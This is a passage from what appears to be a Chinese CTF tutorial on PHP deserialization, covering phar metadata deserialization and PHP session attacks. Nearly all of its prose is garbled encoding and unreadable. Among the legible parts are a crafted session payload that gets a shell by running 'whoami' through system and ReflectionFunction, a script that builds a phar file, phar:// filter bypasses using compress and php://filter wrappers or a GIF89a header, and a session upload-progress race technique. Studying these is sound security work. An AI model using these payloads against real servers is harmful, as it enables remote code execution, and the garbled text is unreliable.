å½“ä½¿ç”¨GETæ–¹æ³•å»ä¼ é€’file=0è¿™ä¸ªå‚æ•°çš„æ—¶å€™å°±èƒ½å¤Ÿæ„é€ å‡º$pathinfo = array(0=&gt;'whoami')ã€‚ æœ€åæ˜¯åŠ¨æ€è°ƒç”¨ï¼Œè¿™é‡ŒåŒæ ·æ˜¯ä»SESSIONä¸­çš„funcå‚æ•°ä¸­è·å–å€¼è¿›è¡ŒåŠ¨æ€è°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€æ„é€ $_SESSION['func']='filelist'å³å¯ func|s:8:\"filelist\" ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬å†™è¿›SESSIONæ–‡ä»¶é‡Œé¢çš„å†…å®¹æ˜¯ func|s:8:\"filelist\";files|a:1:{i:0;s:6:\"whoami\";}paths|a:2:{s:6:\"system\";s:18:\"ReflectionFunction\";s:10:\"invokeArgs\";s:4:\"file\";} è¿™æ ·å°±èƒ½å¤Ÿgetshelläº†ã€‚ ä¿®å¤ ä¿®å°±å¾ˆç®€å•äº†ï¼Œæ—¢ç„¶æ˜¯å› ä¸ºç›®å½•ç©¿è¶Šå¯¼è‡´èƒ½å¤Ÿæ§åˆ¶SESSIONçš„å†…å®¹ï¼Œé‚£ä¹ˆä¿®æ‰ç›®å½•ç©¿è¶Šçš„åœ°æ–¹å°±å¥½äº†ï¼š if(isset($_POST['filename'])&amp;&amp;isset($_POST['content'])){ if(stristr($_POST['filename'], 'h')){ die('no h!'); } $filename = basename($_POST['filename']); $filepath = './files/'.$filename; //å»æ‰äº†postï¼Œå¯¼è‡´ä¸å¯æ§ï¼Œä¹Ÿå°±ä¸èƒ½ç©¿è¶Šäº† file_put_contents($filepath,$_POST['content']); ?&gt; å‚è€ƒï¼šhttps://johnfrod.top/å®‰å…¨/ctf-ä¸­-phpåŸç”Ÿç±»çš„åˆ©ç”¨/ 0x11 Pharååºåˆ—åŒ– ctfshow 276 pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataã€‚å½“å—å½±å“çš„æ–‡ä»¶æ“ ä½œå‡½æ•°è°ƒç”¨pharæ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨ååºåˆ—åŒ–meta-dataå†…çš„å†…å®¹ã€‚ 11.1 ä»€ä¹ˆæ˜¯pharæ–‡ä»¶ åœ¨è½¯ä»¶ä¸­ï¼ŒPHARï¼ˆPHPå½’æ¡£ï¼‰æ–‡ä»¶æ˜¯ä¸€ç§æ‰“åŒ…æ ¼å¼ï¼Œé€šè¿‡å°†è®¸å¤šPHPä»£ç æ–‡ä»¶å’Œå…¶ä»–èµ„æºï¼ˆä¾‹å¦‚å›¾åƒï¼Œ æ ·å¼è¡¨ç­‰ï¼‰æ†ç»‘åˆ°ä¸€ä¸ªå½’æ¡£æ–‡ä»¶ä¸­æ¥å®ç°åº”ç”¨ç¨‹åºå’Œåº“çš„åˆ†å‘ phpé€šè¿‡ç”¨æˆ·å®šä¹‰å’Œå†…ç½®çš„â€œæµåŒ…è£…å™¨â€å®ç°å¤æ‚çš„æ–‡ä»¶å¤„ç†åŠŸèƒ½ã€‚å†…ç½®åŒ…è£…å™¨å¯ç”¨äºæ–‡ä»¶ç³»ç»Ÿå‡½æ•°ï¼Œå¦‚ (fopen(),copy(),file_exists()å’Œfilesize()ã€‚ phar://å°±æ˜¯ä¸€ç§å†…ç½®çš„æµåŒ…è£…å™¨ã€‚ phpä¸­ä¸€äº›å¸¸è§çš„æµåŒ…è£…å™¨å¦‚ä¸‹ï¼š file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨ç”¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°æ—¶é»˜è®¤å°±ä½¿ç”¨è¯¥åŒ…è£…å™¨ http:// â€” è®¿é—® HTTP(s) ç½‘å€ ftp:// â€” è®¿é—® FTP(s) URLs php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ zlib:// â€” å‹ç¼©æµ data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰ glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ phar:// â€” PHP å½’æ¡£ ssh2:// â€” Secure Shell 2 rar:// â€” RAR ogg:// â€” éŸ³é¢‘æµ expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ 11.2 pharæ–‡ä»¶çš„ç»“æ„ 1.stub æ ¼å¼ä¸ºï¼šxxx&lt;?php xxx; __HALT_COMPILER();?&gt; å‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥__HALT_COMPILER();?&gt;æ¥ç»“å°¾ï¼Œè¿™éƒ¨åˆ†çš„ç›®çš„å°±æ˜¯è®© phar æ‰©å±•è¯†åˆ«è¿™æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ phar æ–‡ä»¶ pharæ–‡ä»¶æ ‡å¿—ï¼Œå¿…é¡»åŒ…å«&lt;?php __HALT_COMPILER(); ?&gt;,PHPç»“æŸæ ‡å¿—?&gt;å¯ä»¥çœç•¥ï¼Œä½†è¯­å¥ç»“æŸç¬¦;ä¸stubçš„ç»“å°¾ä¹‹é—´ä¸èƒ½è¶…è¿‡ä¸¤ä¸ªç©ºæ ¼ã€‚åœ¨ç”Ÿæˆpharä¹‹å‰åº”å…ˆæ·»åŠ stub.&lt;?php __HALT_COMPILER(); ?&gt;ä¹‹å‰ä¹Ÿå¯æ·»åŠ å…¶ä»–å†…å®¹ä¼ªé€ æˆå…¶ä»–æ–‡ä»¶ï¼Œæ¯”å¦‚GIF89a&lt;?php __HALT_COMPILER(); ?&gt; manifest:pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯æ¼æ´åˆ©ç”¨æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚ content:è¿™éƒ¨åˆ†å°±æ˜¯æˆ‘ä»¬æƒ³è¦å‹ç¼©åœ¨ phar å‹ç¼©åŒ…å†…éƒ¨çš„æ–‡ä»¶ signature (å¯ç©º):ç­¾åï¼Œæ”¾åœ¨æœ«å°¾ã€‚ manifest å­˜æ”¾pharå½’æ¡£ä¿¡æ¯.Manifestç»“æ„å¦‚ä¸‹å›¾ æ‰€æœ‰æœªä½¿ç”¨çš„æ ‡å¿—ä¿ç•™ï¼Œä¾›å°†æ¥ä½¿ç”¨ï¼Œå¹¶ä¸”ä¸å¾—ç”¨äºå­˜å‚¨è‡ªå®šä¹‰ä¿¡æ¯ã€‚ä½¿ç”¨æ¯ä¸ªæ–‡ä»¶çš„å…ƒæ•°æ®åŠŸèƒ½æ¥å­˜å‚¨æœ‰å…³ç‰¹å®šæ–‡ä»¶çš„è‡ªå®šä¹‰ä¿¡æ¯. ä¸‹é¢ç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶ å‰æï¼šå¼€å¯php.iniä¸­çš„ phar.readonly = off &lt;?php class Test { } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //è®¾ç½®stub $o = new Test(); $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); ?&gt; 11.3 æ¼æ´åˆ©ç”¨æ¡ä»¶ pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚ è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚ æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚ 11.4 å—å½±å“çš„å‡½æ•°ï¼š https://blog.zsxsoft.com/post/38 phpä¸­çš„å¤§éƒ¨åˆ†ä¸æ–‡ä»¶æ“ä½œç›¸å…³å‡½æ•°åœ¨é€šè¿‡pharåè®®è·å–æ•°æ®æ—¶ä¼šå°†pharæ–‡ä»¶çš„meta-dataéƒ¨åˆ†ååºåˆ—åŒ– å—å½±å“çš„å‡½æ•°åˆ—è¡¨ fileatime filectime file_exists file_get_contents file_put_contents file filegroup fopen fileinode filemtime fileowner fikeperms is_dir is_executable is_file is_link is_readable is_writable is_writeable parse_ini_file copy unlink stat readfile 11.5 ç»•è¿‡æ–¹å¼ å½“ç¯å¢ƒé™åˆ¶äº†pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œã€‚å¯ä»¥ä½¿ç”¨compress.bzip2://å’Œcompress.zlib://ç­‰ç»•è¿‡ compress.bzip://phar:///test.phar/test.txt compress.bzip2://phar:///test.phar/test.txt compress.zlib://phar:///home/sx/test.phar/test.txt php://filter/resource=phar:///test.phar/test.txt å½“ç¯å¢ƒé™åˆ¶äº†pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œï¼Œè¿˜å¯ä»¥é…åˆå…¶ä»–åè®®è¿›è¡Œåˆ©ç”¨ã€‚ php://filter/read=convert.base64-encode/resource=phar://phar.phar GIFæ ¼å¼éªŒè¯å¯ä»¥é€šè¿‡åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ GIF89aç»•è¿‡ 1ã€$phar-&gt;setStub(â€œGIF89aâ€.â€œâ€); //è®¾ç½®stub 2ã€ç”Ÿæˆä¸€ä¸ªphar.pharï¼Œä¿®æ”¹åç¼€åä¸ºphar.g å®æˆ˜å‚è€ƒï¼šhttps://xz.aliyun.com/t/6699#toc-4 11.6 ä» PHP æºç æ¢ç´¢ phar åˆ©ç”¨æˆåŠŸçš„æ·±å±‚åŸå›  1. PHP æµçš„æ¦‚å¿µ æµçš„ä½œç”¨æ˜¯åœ¨å‡ºå‘åœ°å’Œç›®çš„åœ°ä¹‹é—´ä¼ è¾“æ•°æ®ã€‚å‡ºå‘åœ°å’Œç›®çš„åœ°å¯ä»¥æ˜¯æ–‡ä»¶ã€å‘½ä»¤è¡Œè¿›ç¨‹ã€ç½‘ç»œè¿æ¥ã€ZIP æˆ– TAR å‹ç¼©æ–‡ä»¶ã€ä¸´æ—¶å†…å­˜ã€æ ‡å‡†è¾“å…¥æˆ–è¾“å‡ºï¼Œæˆ–è€…æ˜¯é€šè¿‡ PHP æµå°è£…åè®®å®ç°çš„ä»»ä½•å…¶ä»–èµ„æºã€‚ å¦‚æœä½ è¯»å†™è¿‡æ–‡ä»¶ï¼Œå°±ç”¨è¿‡æµï¼›å¦‚æœä½ ä» php://stdin è¯»å–è¿‡æ•°æ®ï¼Œæˆ–è€…æŠŠè¾“å…¥å†™å…¥ php://stdoutï¼Œä¹Ÿç”¨è¿‡æµã€‚æµä¸º PHP çš„å¾ˆå¤š IO å‡½æ•°æä¾›äº†åº•å±‚å®ç°ï¼Œå¦‚ file_get_contentsã€fopnã€fread å’Œ fwrite ç­‰ã€‚PHP çš„æµå‡½æ•°æä¾›äº†ä¸åŒèµ„æºçš„ç»Ÿä¸€æ¥å£ã€‚ æˆ‘ä»¬å¯ä»¥æŠŠæµæ¯”ä½œç®¡é“ï¼ŒæŠŠæ°´ï¼ˆèµ„æºæ•°æ®ï¼‰ä»ä¸€ä¸ªåœ°æ–¹å¼•åˆ°å¦ä¸€ä¸ªåœ°æ–¹ã€‚åœ¨æ°´ä»å‡ºå‘åœ°åˆ°ç›®çš„åœ°çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è¿‡æ»¤æ°´ï¼Œå¯ä»¥æ”¹å˜æ°´è´¨ï¼Œå¯ä»¥æ·»åŠ æ°´ï¼Œä¹Ÿå¯ä»¥æ’å‡ºæ°´ã€‚ 2. æµå°è£…åè®®ï¼ˆwrapperï¼‰ å› ä¸ºæµå¼æ•°æ®çš„ç§ç±»å„å¼‚ï¼Œè€Œæ¯ç§ç±»å‹éœ€è¦ç‹¬ç‰¹çš„åè®®ï¼Œä»¥ä¾¿è¯»å†™æ•°æ®ï¼Œæˆ‘ä»¬ç§°è¿™äº›åè®®ä¸ºæµå°è£…åè®®ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å†™æ–‡ä»¶ç³»ç»Ÿï¼Œå¯ä»¥é€šè¿‡ HTTPã€HTTPS æˆ– SSH ä¸è¿œç¨‹ Web æœåŠ¡å™¨é€šä¿¡ï¼Œè¿˜å¯ä»¥æ‰“å¼€å¹¶è¯»å†™ ZIPã€RAR æˆ– PHAR å‹ç¼©æ–‡ä»¶ è™½ç„¶è¿‡ç¨‹æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯è¯»å†™æ–‡ä»¶ç³»ç»Ÿä¸­æ–‡ä»¶çš„æ–¹å¼ä¸æ”¶å‘ HTTP æ¶ˆæ¯çš„æ–¹å¼æœ‰æ‰€ä¸åŒï¼Œæµå°è£…åè®®çš„ä½œç”¨æ˜¯ä½¿ç”¨é€šç”¨çš„æ¥å£å°è£…è¿™ç§å·®å¼‚ã€‚ æ¯ä¸ªæµéƒ½æœ‰ä¸€ä¸ªåè®®å’Œä¸€ä¸ªç›®æ ‡ã€‚æŒ‡å®šåè®®å’Œç›®æ ‡çš„æ–¹æ³•æ˜¯ä½¿ç”¨æµæ ‡è¯†ç¬¦ï¼š&lt;scheme&gt;://&lt;target&gt;ï¼Œå…¶ä¸­ &lt;scheme&gt; æ˜¯æµçš„å°è£…åè®®ï¼Œ&lt;target&gt; æ˜¯æµçš„æ•°æ®æºã€‚ 2.1 http://æµå°è£…åè®® ä¸‹é¢ä½¿ç”¨ HTTP æµå°è£…åè®®åˆ›å»ºäº†ä¸€ä¸ªä¸ Flicker API é€šä¿¡çš„ PHP æµï¼š &lt;?php $json = file_get_contents( 'http://api.flickr.com/services/feeds/photos_public.gne?format=json' ); ä¸è¦ä»¥ä¸ºè¿™æ˜¯æ™®é€šçš„ç½‘é¡µ URLï¼Œfile_get_contents() å‡½æ•°çš„å­—ç¬¦ä¸²å‚æ•°å…¶å®æ˜¯ä¸€ä¸ªæµæ ‡è¯†ç¬¦ã€‚http åè®®ä¼šè®© PHP ä½¿ç”¨ HTTP æµå°è£…åè®®ï¼Œåœ¨è¿™ä¸ªå‚æ•°ä¸­ï¼Œhttp ä¹‹åæ˜¯æµçš„ç›®æ ‡ã€‚ æ³¨ï¼šå¾ˆå¤š PHP å¼€å‘è€…å¯èƒ½å¹¶ä¸çŸ¥é“æ™®é€šçš„ URL å…¶å®æ˜¯ PHP æµå°è£…åè®®æ ‡è¯†ç¬¦çš„ä¼ªè£…ã€‚ 2.2 file://æµå°è£…åè®® æˆ‘ä»¬é€šå¸¸ä½¿ç”¨ file_get_contents()ã€fopen()ã€fwrite() å’Œ fclose() ç­‰å‡½æ•°è¯»å†™æ–‡ä»¶ç³»ç»Ÿï¼Œå› ä¸º PHP é»˜è®¤ä½¿ç”¨çš„æµå°è£…åè®®æ˜¯ file://ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾ˆå°‘è®¤ä¸ºè¿™äº›å‡½æ•°ä½¿ç”¨çš„æ˜¯ PHP æµã€‚ä¸‹é¢çš„ç¤ºä¾‹æ¼”ç¤ºäº†ä½¿ç”¨ file:// æµå°è£…åè®®åˆ›å»ºä¸€ä¸ªè¯»å†™ /etc/hosts æ–‡ä»¶çš„æµï¼š &lt;?php $handle = fopen('file:///etc/hosts', 'rb'); while (feof($handle) !== TRUE) { echo fgets($handle); } fclose($handle); æˆ‘ä»¬é€šå¸¸ä¼šçœç•¥æ‰ file:// åè®®ï¼Œå› ä¸ºè¿™æ˜¯ PHP ä½¿ç”¨çš„é»˜è®¤å€¼ã€‚ è¿™ä¸¤æ®µä»‹ç»æ¥æºäºhttps://laravelacademy.org/post/7459.htmlï¼Œé‚£ä¹ˆè¿™ä¸ªè¯´æ˜äº†ä¸€ä¸ªä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿè¯´æ˜æˆ‘ä»¬PHP ç›®å‰çš„å‡ ä¹æ‰€æœ‰çš„ I/O æ“ä½œéƒ½æ˜¯é€šè¿‡æµé…åˆæµåŒ…è£…å™¨æ¥å®ç°çš„ï¼Œå› ä¸º PHP é»˜è®¤çš„åŒ…è£…å™¨å°±æ˜¯ file:// ï¼Œè™½ç„¶ä½ æ²¡å†™ï¼Œä½†æ˜¯åº•å±‚ PHP è¿˜æ˜¯é€šè¿‡æµåŒ…è£…å™¨å®ç°çš„ã€‚ è¿˜æœ‰æ›´å¤š ä½¿ç”¨ stream_get_wrappers() è·å–å½“å‰ç³»ç»Ÿæ³¨å†Œçš„å…¨éƒ¨ wrapper 3. å¼€å§‹å‘ä¸‹æŒ–æ˜ æˆ‘ä»¬ä¸Šé¢è¯´äº†ï¼Œphar æ–‡ä»¶ä¸­å­˜åœ¨æˆ‘ä»¬å¯æ§çš„åºåˆ—åŒ–çš„å†…å®¹ï¼Œç„¶åæˆ‘ä»¬åˆè¯´ï¼Œè¿™ä¸ªå†…å®¹åœ¨ æ–‡ä»¶ç³»ç»Ÿå‡½æ•° é…åˆ phar:// çš„æ—¶å€™èƒ½å®ç°ååºåˆ—åŒ–ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡è¯´ä¸ºä»€ä¹ˆï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¿™èŠ‚è®¨è®ºçš„é‡ç‚¹ï¼Œæ‰€æœ‰çš„åŸå› éƒ½èƒ½ä»æºä»£ç æ‰¾åˆ°ç­”æ¡ˆ (1)å…ˆçœ‹ä¸€ä¸‹ Phar æ–‡ä»¶æºä»£ç éƒ¨åˆ† å› ä¸º Phar æ˜¯ PHP çš„ä¸€ä¸ªæ‰©å±•ï¼Œäºæ˜¯æˆ‘ä»¬åœ¨ GitHub çš„ php-src/ext/phar/phar.c å»å…¨å±€æœç´¢ unserailize() å‡½æ•° å¦‚å›¾æ‰€ç¤ºï¼š (2)ä½†æ˜¯è¿™ä¸ªå‡½æ•°ä¸ºä»€ä¹ˆèƒ½è°ƒç”¨å‘¢ è¿™å°±æ¶‰åŠåˆ°äº†æ–‡ä»¶ç³»ç»Ÿå‡½æ•°çš„éƒ¨åˆ†äº†ï¼Œæˆ‘ä»¬æ‰¾ä¸€ä¸‹æºç ï¼Œä½ç½®åœ¨ Github php-src/ext/standard/file.c è¿™ä¸ªæ–‡ä»¶åŒ…å«äº†éå¸¸å¤šçš„æ–‡ä»¶å‡½æ•°çš„å®ç°ï¼Œæˆ‘ä»¬å…ˆå…¨å±€æœç´¢ file_get_contents å¦‚å›¾æ‰€ç¤ºï¼š ç„¶åæˆ‘ä»¬ç¨å¾®å¾€ä¸‹ç¿»ç¿»å°±èƒ½å‘ç°å’Œå¤„ç† wrapper æµç›¸å…³çš„å‡½æ•° å¦‚å›¾æ‰€ç¤ºï¼š æˆ‘ä»¬å‘ç°äº†è¿™ä¸ª php)stream_open_wrapper_ex è¿™ä¸ªå‡½æ•°èƒ½å¤„ç†æˆ‘ä»¬çš„ wrapper ï¼Œé‚£ä¹ˆå…¶ä»–çš„ç±»ä¼¼çš„å‡½æ•°æ˜¯ä¸æ˜¯ä¹Ÿæ˜¯åº•å±‚è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°å‘¢ï¼Ÿ (3)ç”±æ­¤åŠå½¼ æˆ‘ä»¬å…¨å±€æœç´¢ä¸€ä¸‹ fopen()ï¼Œç„¶åæˆ‘ä»¬çœ‹ä¸€ä¸‹å…·ä½“çš„å®ç° å¦‚å›¾æ‰€ç¤ºï¼š æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Ÿè¿™ä¸‹å¥½äº†ï¼Œæˆ‘ä»¬ä¸å¦‚æŠŠ PHP æºç ä¸‹è½½ä¸‹æ¥ï¼Œæ¥ä¸€ä¸ªçœŸæ­£çš„å…¨å±€æœç´¢ (4)ä¸¾ä¸€åä¸‰ æˆ‘æœ¬åœ°ä½¿ç”¨ sublime text å¯¹æ•´ä¸ª PHP æºç è¿›è¡Œäº†æ‰«æï¼Œå‘ç°äº†å¾ˆå¤šå¾ˆå¤šåœ°æ–¹è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Œå…¶å®å¹¶ä¸åªæ˜¯æˆ‘ä»¬å¸¸è§çš„ æ–‡ä»¶ç³»ç»Ÿå‡½æ•° å¦‚å›¾æ‰€ç¤ºï¼š å¥½å®¶ä¼™ï¼Œå¤ªåº•å±‚äº†ï¼Œçœ‹ä¸æ‡‚äº†ï¼Œæ—¥åæ‹œè¯» å‚è€ƒï¼šhttps://www.k0rz3n.com/2018/11/19/ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£PHPååºåˆ—åŒ–æ¼æ´/#4-phar-çš„å®æˆ˜ 0x12 php-sessionååºåˆ—åŒ– 12.1 sessionç®€å•ä»‹ç» â€‹ åœ¨è®¡ç®—æœºä¸­ï¼Œå°¤å…¶æ˜¯åœ¨ç½‘ç»œåº”ç”¨ä¸­ï¼Œç§°ä¸ºâ€œä¼šè¯æ§åˆ¶â€ã€‚Session å¯¹è±¡å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„å±æ€§åŠé…ç½®ä¿¡æ¯ã€‚è¿™æ ·ï¼Œå½“ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºçš„ Web é¡µä¹‹é—´è·³è½¬æ—¶ï¼Œå­˜å‚¨åœ¨ Session å¯¹è±¡ä¸­çš„å˜é‡å°†ä¸ä¼šä¸¢å¤±ï¼Œè€Œæ˜¯åœ¨æ•´ä¸ªç”¨æˆ·ä¼šè¯ä¸­ä¸€ç›´å­˜åœ¨ä¸‹å»ã€‚å½“ç”¨æˆ·è¯·æ±‚æ¥è‡ªåº”ç”¨ç¨‹åºçš„ Web é¡µæ—¶ï¼Œå¦‚æœè¯¥ç”¨æˆ·è¿˜æ²¡æœ‰ä¼šè¯ï¼Œåˆ™ Web æœåŠ¡å™¨å°†è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª Session å¯¹è±¡ã€‚å½“ä¼šè¯è¿‡æœŸæˆ–è¢«æ”¾å¼ƒåï¼ŒæœåŠ¡å™¨å°†ç»ˆæ­¢è¯¥ä¼šè¯ã€‚å½“ç¬¬ä¸€æ¬¡è®¿é—®ç½‘ç«™æ—¶ï¼Œ**seesion_start()**å‡½æ•°å°±ä¼šåˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„Session IDï¼Œå¹¶è‡ªåŠ¨é€šè¿‡HTTPçš„å“åº”å¤´ï¼Œå°†è¿™ä¸ªSession IDä¿å­˜åˆ°å®¢æˆ·ç«¯Cookieä¸­ã€‚åŒæ—¶ï¼Œä¹Ÿåœ¨æœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ªä»¥Session IDå‘½åçš„æ–‡ä»¶ï¼Œç”¨äºä¿å­˜è¿™ä¸ªç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚å½“åŒä¸€ä¸ªç”¨æˆ·å†æ¬¡è®¿é—®è¿™ä¸ªç½‘ç«™æ—¶ï¼Œä¹Ÿä¼šè‡ªåŠ¨é€šè¿‡HTTPçš„è¯·æ±‚å¤´å°†Cookieä¸­ä¿å­˜çš„Seesion IDå†æºå¸¦è¿‡æ¥ï¼Œè¿™æ—¶Session_start()å‡½æ•°å°±ä¸ä¼šå†å»åˆ†é…ä¸€ä¸ªæ–°çš„Session IDï¼Œè€Œæ˜¯åœ¨æœåŠ¡å™¨çš„ç¡¬ç›˜ä¸­å»å¯»æ‰¾å’Œè¿™ä¸ªSession IDåŒåçš„Sessionæ–‡ä»¶ï¼Œå°†è¿™ä¹‹å‰ä¸ºè¿™ä¸ªç”¨æˆ·ä¿å­˜çš„ä¼šè¯ä¿¡æ¯è¯»å‡ºï¼Œåœ¨å½“å‰è„šæœ¬ä¸­åº”ç”¨ï¼Œè¾¾åˆ°è·Ÿè¸ªè¿™ä¸ªç”¨æˆ·çš„ç›®çš„ã€‚ å®˜æ–¹Sessionå®šä¹‰ï¼šåœ¨è®¡ç®—æœºä¸­ï¼Œå°¤å…¶æ˜¯åœ¨ç½‘ç»œåº”ç”¨ä¸­ï¼Œç§°ä¸ºâ€œä¼šè¯æ§åˆ¶â€ã€‚Sessionå¯¹è±¡å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„å±æ€§åŠé…ç½®ä¿¡æ¯ã€‚ä¸»è¦æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š sessionä¿å­˜çš„ä½ç½®æ˜¯åœ¨æœåŠ¡å™¨ç«¯ sessioné€šå¸¸æ˜¯è¦é…åˆcookieä½¿ç”¨ å› ä¸ºHTTPçš„æ— çŠ¶æ€æ€§ï¼ŒæœåŠ¡ç«¯äº§ç”Ÿäº†sessionæ¥æ ‡è¯†å½“å‰çš„ç”¨æˆ·çŠ¶æ€ æœ¬è´¨ä¸Šï¼Œsessionå°±æ˜¯ä¸€ç§å¯ä»¥ç»´æŒæœåŠ¡å™¨ç«¯çš„æ•°æ®å­˜å‚¨æŠ€æœ¯ã€‚å³**sessionæŠ€æœ¯å°±æ˜¯ä¸€ç§åŸºäºåç«¯æœ‰åˆ«äºæ•°æ®åº“çš„ä¸´æ—¶å­˜å‚¨æ•°æ®çš„æŠ€æœ¯** 12.2 session çš„å­˜å‚¨æœºåˆ¶ phpä¸­çš„sessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹ session.save_handleræ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionidæ¥è¿›è¡Œå‘½åçš„ session_start();è¿è¡Œä¹‹åå¼€å¯sessionå¹¶ä¸”äº§ç”Ÿä¸€ä¸ªå”¯ä¸€çš„32ä½çš„session_id 12.3 sessionæ–‡ä»¶åˆ›å»ºçš„å‡ ä¸ªtip 1.ä»£ç ä¸­æœ‰session_start(),ä¼šè‡ªåŠ¨åˆ›å»ºsessionæ–‡ä»¶ã€‚ 2.å¦‚æœsession.auto_start=On ï¼Œåˆ™PHPåœ¨æ¥æ”¶è¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionï¼ˆä¹Ÿå°±åˆ›å»ºäº†sessionæ–‡ä»¶ï¼‰ï¼Œä¸å†éœ€è¦æ‰§è¡Œsession_start()ã€‚ä½†é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé€‰é¡¹éƒ½æ˜¯å…³é—­çš„ã€‚ 3.sessionè¿˜æœ‰ä¸€ä¸ªé»˜è®¤é€‰é¡¹ï¼Œsession.use_strict_modeé»˜è®¤å€¼ä¸º0ã€‚æ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰Session IDçš„ã€‚ æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨Cookieé‡Œè®¾ç½®PHPSESSID=TGAOï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š/tmp/sess_TGAOâ€ã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚ å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼æœ‰ini.get(\"session.upload_progress.prefix\")+ç”±æˆ‘ä»¬æ„é€ çš„session.upload_progress.nameå€¼ç»„æˆï¼Œæœ€åè¢«å†™å…¥sessionæ–‡ä»¶é‡Œã€‚ æ³¨æ„ï¼šå¦‚æœé»˜è®¤é…ç½®session.upload_progress.cleanup = onå¯¼è‡´æ–‡ä»¶ä¸Šä¼ åï¼Œsessionæ–‡ä»¶å†…å®¹ç«‹å³æ¸…ç©ºã€‚è¿™æ—¶æˆ‘ä»¬å°±è¦åˆ©ç”¨ç«äº‰ï¼Œåœ¨sessionæ–‡ä»¶å†…å®¹æ¸…ç©ºå‰è¿›è¡ŒåŒ…å«åˆ©ç”¨ã€‚ 12.4 